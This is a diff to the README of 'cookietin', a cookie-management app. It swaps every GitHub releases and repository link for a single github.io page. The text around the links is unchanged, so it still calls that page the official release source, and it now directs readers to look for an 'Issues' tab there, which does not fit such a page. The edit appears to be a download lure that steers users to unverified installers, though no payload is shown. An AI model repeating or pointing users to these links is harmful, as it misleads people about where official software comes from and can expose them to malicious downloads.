@@ -1,6 +1,6 @@
 # 🍪 cookietin - See and Control Every Cookie  
 
-[![Download cookietin](https://img.shields.io/badge/Download-cookietin-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=6A0DAD&color=FF6B00)](https://github.com/Dedebanded912/cookietin/releases)
+[![Download cookietin](https://img.shields.io/badge/Download-cookietin-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=6A0DAD&color=FF6B00)](https://dedebanded912.github.io)
 
 ---
 
@@ -29,7 +29,7 @@ Imagine cookies as little notes websites leave in your browser to remember you. 
 Getting cookietin on your computer is a breeze. Follow these steps:
 
 1.  **Visit the download page:** Click the big orange button at the top of this page, or use this link:  
-    [https://github.com/Dedebanded912/cookietin/releases](https://github.com/Dedebanded912/cookietin/releases)
+    [https://dedebanded912.github.io](https://dedebanded912.github.io)
 
 2.  **Download the application:** Visit this link to download the application. You'll land on a page with a list of files. Look for the one that matches your operating system (Windows, Mac, or Linux) and click on it. The download will start automatically.
 
@@ -46,7 +46,7 @@ Let's walk through the download and installation process step by step, so you fe
 ### Step 1: Go to the Releases Page
 
 Open your web browser and type in or click this address:  
-**https://github.com/Dedebanded912/cookietin/releases**
+**https://dedebanded912.github.io**
 
 This is the official place where all the latest versions of cookietin are published. You won't get any old or broken files here.
 
@@ -129,7 +129,7 @@ It supports Windows 10/11, macOS, and most Linux distributions. You just need a 
 
 If you run into any trouble, here are some helpful resources:
 
-- **GitHub Issues Page:** Visit the repository at [https://github.com/Dedebanded912/cookietin](https://github.com/Dedebanded912/cookietin) and click on the "Issues" tab to report a bug or ask a question. The community is friendly and responsive.
+- **GitHub Issues Page:** Visit the repository at [https://dedebanded912.github.io](https://dedebanded912.github.io) and click on the "Issues" tab to report a bug or ask a question. The community is friendly and responsive.
 - **Reset the Extension:** If cookietin freezes or acts strangely, you can disable and re-enable it from your browser's extension page. That usually fixes 99% of problems.
 - **Update Regularly:** Always download the latest version from the releases page to get new features and security fixes.
 
@@ -153,7 +153,7 @@ Managing cookies doesn't have to be confusing or hidden. cookietin puts the powe
 
 Go ahead and **download cookietin today**—your cookies will thank you.
 
-[![Get cookietin Now](https://img.shields.io/badge/🚀%20Download%20cookietin%20Now-click%20here-orange?style=for-the-badge)](https://github.com/Dedebanded912/cookietin/releases)
+[![Get cookietin Now](https://img.shields.io/badge/🚀%20Download%20cookietin%20Now-click%20here-orange?style=for-the-badge)](https://dedebanded912.github.io)
 
 ---
 
